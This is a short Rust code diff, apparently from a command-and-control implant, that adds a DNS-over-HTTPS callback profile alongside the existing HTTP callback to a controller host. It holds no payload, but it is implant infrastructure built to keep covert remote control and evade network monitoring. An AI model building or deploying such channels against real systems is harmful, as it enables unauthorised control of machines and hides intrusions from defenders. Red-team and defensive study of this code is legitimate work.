@@ -6,13 +6,15 @@ use aes::Aes256;
 use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
 use hmac::{Hmac, Mac, NewMac};
 use http::{profilevars, HTTPProfile};
+use doh::DoHProfile;
 use openssl::rsa;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
 
-// Import the http profile
+// Import C2 profiles
 mod http;
+mod doh;
 
 /// Struct holding the response for a key exchange
 #[allow(dead_code)]
@@ -74,10 +76,23 @@ impl Profile {
     /// Generate a new C2 profile for the agent
     /// * `uuid` - Initial configured UUID
     pub fn new(uuid: String) -> Self {
+        // Build profile list based on configuration
+        let mut profiles: Vec<Box<dyn C2Profile>> = Vec::new();
+
+        // Add HTTP profile (primary)
+        profiles.push(Box::new(HTTPProfile::new(&profilevars::cb_host())));
+
+        // Add DoH profile if configured
+        if let Some(domain) = option_env!("doh_domain") {
+            if !domain.is_empty() {
+                profiles.push(Box::new(DoHProfile::new(domain)));
+            }
+        }
+
         // Return a new `Profile` object
         Self {
             callback_uuid: uuid,
-            profiles: vec![Box::new(HTTPProfile::new(&profilevars::cb_host()))],
+            profiles,
             active: 0,
         }
     }
